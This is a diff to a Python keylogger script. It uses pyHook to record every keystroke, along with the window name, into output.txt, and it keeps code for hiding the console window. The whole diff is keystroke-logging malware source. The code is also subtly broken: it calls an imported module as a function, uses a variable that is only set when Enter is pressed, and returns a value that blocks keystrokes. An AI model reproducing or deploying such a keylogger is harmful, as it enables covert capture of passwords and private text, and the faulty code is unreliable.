@@ -1,13 +1,14 @@
-#import
-#import win32api
-#import win32console
-#import win32gui
+import win32api
+import win32console
+import win32gui
 import pythoncom, pyHook
+import processing as p
 '''
 win = win32console.GetConsoleWindow()
 win32gui.ShowWindow(win, 0) //3 for max size
-#https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
-#http://pyhook.sourceforge.net/doc_1.5.0/pyhook.HookManager.KeyboardEvent-class.html
+# https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
+# http://pyhook.sourceforge.net/doc_1.5.0/pyhook.HookManager.KeyboardEvent-class.html
+# http://www.asciitable.com/
 '''
 
 
@@ -31,17 +32,22 @@ win32gui.ShowWindow(win, 0) //3 for max size
 def OnKeyboardEvent(event):
     data = (event.WindowName, event.Window, event.Time, event.Ascii, event.Key, event.Alt, event.KeyID)
     print(data)
-    print(chr(event.Ascii))
+    print(chr(event.KeyID))
+
     # open output.txt to read current keystrokes
-    f = open('D:\PyCharm Community Edition 2019.2.3\key_log\output.txt', 'r+')
+    f = open('output.txt', 'r+')
     buffer = f.read()
     f.close()
+
+    keylogs_ID = event.KeyID
+    #do the flitering here
+
+    if event.KeyID == 13: # enter pressed
+        keylogs = '\n'
+    buffer += p(keylogs_ID)
+
     # open output.txt to write current + new keystrokes
-    f = open('D:\PyCharm Community Edition 2019.2.3\key_log\output.txt', 'w')
-    keylogs = chr(event.KeyID)
-    if event.Ascii == 13:
-        keylogs = '/n'
-    buffer += keylogs
+    f = open('output.txt', 'w')
     f.write(buffer)
     f.close()
     return 0
@@ -56,21 +62,7 @@ def OnKeyboardEvent(event):
         print(data) # debugging
         print(keylogs)
     '''
-    '''
-    if event.Ascii != 0 or 8:
-        # open output.txt to read current keystrokes
-        f = open('D:\PyCharm Community Edition 2019.2.3\key_log\output.txt', 'r+')
-        buffer = f.read()
-        f.close()
-        # open output.txt to write current + new keystrokes
-        f = open('D:\PyCharm Community Edition 2019.2.3\key_log\output.txt', 'w')
-        keylogs = chr(event.Ascii)
-        if event.Ascii == 13:
-            keylogs = '/n'
-        buffer += keylogs
-        f.write(buffer)
-        f.close()
-        '''
+
 
 # create a hook manager object
 hm = pyHook.HookManager()
